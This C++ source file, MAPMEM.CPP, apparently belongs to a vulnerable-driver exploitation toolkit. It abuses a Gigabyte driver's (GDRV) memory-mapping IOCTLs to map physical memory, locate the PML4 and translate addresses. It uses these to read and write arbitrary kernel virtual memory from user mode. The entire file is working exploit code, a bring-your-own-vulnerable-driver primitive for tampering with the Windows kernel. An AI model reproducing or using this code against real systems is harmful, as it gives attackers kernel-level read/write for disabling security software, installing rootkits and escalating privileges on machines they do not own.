/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2021
*
*  TITLE:       MAPMEM.CPP
*
*  VERSION:     1.10
*
*  DATE:        02 Apr 2021
*
*  MAPMEM driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/mapmem.h"

//
// Gigabyte driver based on MAPMEM.SYS Microsoft Windows NT 3.51 DDK example from 1993.
//

ULONG g_MapMem_MapIoctl;
ULONG g_MapMem_UnmapIoctl;

/*
* MapMemMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID MapMemMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes)
{
    PVOID pMapSection = NULL;
    MAPMEM_PHYSICAL_MEMORY_INFO request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BusAddress.QuadPart = PhysicalAddress;
    request.Length = NumberOfBytes;

    if (supCallDriver(DeviceHandle,
        g_MapMem_MapIoctl,
        &request,
        sizeof(request),
        (PVOID)&pMapSection,
        sizeof(PVOID)))
    {
        return pMapSection;
    }

    return NULL;
}

/*
* MapMemUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID MapMemUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap
)
{
    supCallDriver(DeviceHandle,
        g_MapMem_UnmapIoctl,
        &SectionToUnmap,
        sizeof(PVOID),
        NULL,
        0);
}

/*
* GioVirtualToPhysicalEx
*
* Purpose:
*
* Translate virtual address to the physical.
*
* WARNING:
* RED ALERT, GDRV always(!) truncates physical address to 4 bytes. DO NOT USE.
*
*/
BOOL WINAPI GioVirtualToPhysicalEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    GIO_VIRTUAL_TO_PHYSICAL request;

    if (PhysicalAddress)
        *PhysicalAddress = 0;
    else {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    request.Address.QuadPart = VirtualAddress;

    if (supCallDriver(DeviceHandle,
        IOCTL_GDRV_VIRTUALTOPHYSICAL,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *PhysicalAddress = request.Address.LowPart;
        bResult = TRUE;
    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* GioQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI GioQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    DWORD dwError = ERROR_SUCCESS;
    ULONG_PTR pbLowStub1M = NULL, PML4 = 0;


    *Value = 0;

    do {

        pbLowStub1M = (ULONG_PTR)MapMemMapMemory(DeviceHandle,
            0ULL,
            0x100000);

        if (pbLowStub1M == 0) {
            dwError = GetLastError();
            break;
        }

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;
        else
            *Value = 0;

        MapMemUnmapMemory(DeviceHandle, (PVOID)pbLowStub1M);

    } while (FALSE);

    SetLastError(dwError);
    return (PML4 != 0);
}

/*
* GioVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI GioVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    BOOL bResult = FALSE;

    if (PhysicalAddress)
        *PhysicalAddress = 0;
    else {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    bResult = PwVirtualToPhysical(DeviceHandle,
        GioQueryPML4Value,
        GioReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);

    return bResult;
}

/*
* GioReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI GioReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;

    //
    // Map physical memory section.
    //
    mappedSection = MapMemMapMemory(DeviceHandle,
        PhysicalAddress,
        NumberOfBytes);

    if (mappedSection) {

        __try {

            if (DoWrite) {
                RtlCopyMemory(mappedSection, Buffer, NumberOfBytes);
            }
            else {
                RtlCopyMemory(Buffer, mappedSection, NumberOfBytes);
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            bResult = FALSE;
            SetLastError(GetExceptionCode());
        }

        //
        // Unmap physical memory section.
        //
        MapMemUnmapMemory(
            DeviceHandle,
            mappedSection);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* GioReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI GioReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return GioReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* GioWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI GioWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return GioReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* GioWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory via GDRV.
*
*/
BOOL WINAPI GioWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;
    DWORD dwError = ERROR_SUCCESS;

    bResult = GioVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = GioReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

        if (!bResult)
            dwError = GetLastError();

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* GioReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory via GDRV.
*
*/
BOOL WINAPI GioReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;
    DWORD dwError = ERROR_SUCCESS;

    bResult = GioVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = GioReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

        if (!bResult)
            dwError = GetLastError();

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* MapMemRegisterDriver
*
* Purpose:
*
* Register MapMem driver.
*
*/
BOOL WINAPI MapMemRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    ULONG DriverId = PtrToUlong(Param);

    UNREFERENCED_PARAMETER(DeviceHandle);

    switch (DriverId) {
    case IDR_GDRV:
    default:
        g_MapMem_MapIoctl = IOCTL_GDRV_MAP_USER_PHYSICAL_MEMORY;
        g_MapMem_UnmapIoctl = IOCTL_GDRV_UNMAP_USER_PHYSICAL_MEMORY;
        break;
    }

    return TRUE;
}
